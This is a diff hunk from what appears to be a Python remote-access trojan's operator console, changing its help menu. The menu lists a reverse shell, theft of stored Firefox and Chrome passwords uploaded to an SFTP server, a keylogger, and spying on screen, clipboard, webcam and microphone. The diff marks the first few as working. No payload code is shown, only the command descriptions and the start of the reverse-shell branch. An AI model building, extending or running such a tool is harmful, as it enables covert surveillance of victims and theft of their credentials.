@@ -124,15 +124,16 @@ def create_command_file(ftps):
         if (command == "help"):
             print("[+] The following commands are available:")
             print("[+] reverse_shell: opens up an interactive reverse shell on the client. Be careful, this will be a direct connection to the client!")
-            print("[+] get passwords: gets all the stored passwords from firefox and chrome (at least tries to) and sends them to the sftp server. Can be downloaded by get files command!")
+            print("[+] get passwords: gets all the stored passwords from firefox and chrome (at least tries to) and sends them to the sftp server in keylogger.txt. Can be downloaded by get files command!")
             print("[+] get files: gets all the files from the sftp server and downloads them to the current directory!")
+            print("[+] get keylogger: gets the keylogger information of the client and sends it to the sftp server. Can be downloaded by get files command!")
+            print("------------------------Only the above are working at the moment!------------------------")
             print("[+] get screenshot: takes a screenshot of the clients screen and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get clipboard: gets the clipboard content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get webcam: gets the webcam content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get microphone: gets the microphone content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get system info: gets the system information of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get process: gets the process information of the client and sends it to the sftp server. Can be downloaded by get files command!")
-            print("[+] get keylogger: gets the keylogger information of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] exit = exit")
             command = input("Enter command: ")
         elif (command == "reverse_shell"):
